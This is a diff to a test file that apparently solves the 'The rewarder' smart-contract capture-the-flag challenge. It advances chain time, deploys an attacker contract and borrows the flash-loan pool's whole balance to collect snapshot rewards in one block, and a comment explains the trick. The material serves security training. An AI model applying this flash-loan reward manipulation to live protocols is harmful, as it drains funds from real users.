@@ -66,6 +66,17 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        const attackerFactory = await ethers.getContractFactory("theRewarderAttacker", attacker)
+        this.attacker = await attackerFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address, this.rewardToken.address, this.liquidityToken.address);
+        this.attacker.connect(attacker).attack(this.liquidityToken.balanceOf(this.flashLoanPool.address));
+
+        /**
+         * We first wait for the next snapshot time,
+         * as snapshot and distribution are done in the time when user deposit, we can withdrawl immediately after we deposit
+         * this allows us to receive the rewards and pay back the flash loan in the same block
+         */
     });
 
     after(async function () {
